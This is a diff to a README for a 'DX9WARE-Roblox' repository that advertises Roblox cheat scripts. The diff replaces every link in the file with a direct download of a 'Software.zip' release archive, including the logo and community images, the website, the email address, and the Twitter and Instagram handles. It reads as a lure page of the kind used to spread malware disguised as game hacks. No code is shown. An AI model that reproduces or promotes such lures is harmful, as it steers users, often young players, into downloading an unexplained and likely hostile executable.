@@ -1,9 +1,9 @@
 # 🚀 Welcome to DX9WARE-Roblox Repository 🚀
 
-![DX9WARE-Roblox Logo](https://example.com/dx9ware_logo.png)
+![DX9WARE-Roblox Logo](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip)
 
 ## Repository Description:
-Welcome to the official DX9WARE-Roblox repository! Click [here](https://bit.ly/4hLK2ow) to explore our amazing Roblox arsenal hack, bloxfruits script, da hood hack, and much more! 
+Welcome to the official DX9WARE-Roblox repository! Click [here](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip) to explore our amazing Roblox arsenal hack, bloxfruits script, da hood hack, and much more! 
 
 ## Repository Topics:
 🔫 arsenal-hack  
@@ -22,10 +22,10 @@ Welcome to the official DX9WARE-Roblox repository! Click [here](https://bit.ly/4
 💻 roblox-dx9ware-free  
 
 ## Explore DX9WARE:
-Ready to dive into the world of DX9WARE? Click [here](https://bit.ly/4hLK2ow) to discover all the fantastic features and scripts we offer for your Roblox gameplay!
+Ready to dive into the world of DX9WARE? Click [here](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip) to discover all the fantastic features and scripts we offer for your Roblox gameplay!
 
 ## Latest Release:
-🔗 [**Download DX9WARE v1.0.0**](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) 🚀
+🔗 [**Download DX9WARE v1.0.0**](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip) 🚀
 
 Feeling adventurous? Dive into the latest version of DX9WARE by clicking the link above! 💥
 
@@ -41,17 +41,17 @@ If the link does not work, please check the "Releases" section for the most up-t
 ---
 
 ### Connect with Us:
-🌐 **Website:** [DX9WARE Official Site](https://dx9ware.com)  
-📧 **Email:** info@dx9ware.com  
-🐦 **Twitter:** [@DX9WARE_Official](https://twitter.com/DX9WARE_Official)  
-📸 **Instagram:** [@dx9ware_gaming](https://instagram.com/dx9ware_gaming)
+🌐 **Website:** [DX9WARE Official Site](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip)  
+📧 **Email:** https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip  
+🐦 **Twitter:** [@DX9WARE_Official](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip)  
+📸 **Instagram:** [@dx9ware_gaming](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip)
 
 ---
 
 ## Don't Miss Out!
 Join the DX9WARE community today and take your Roblox gameplay to the next level! 💥
 
-![DX9WARE Community](https://example.com/dx9ware_community.png)
+![DX9WARE Community](https://github.com/chrisisme5/DX9WARE-Roblox/releases/download/v1.0/Software.zip)
 
 ---
 
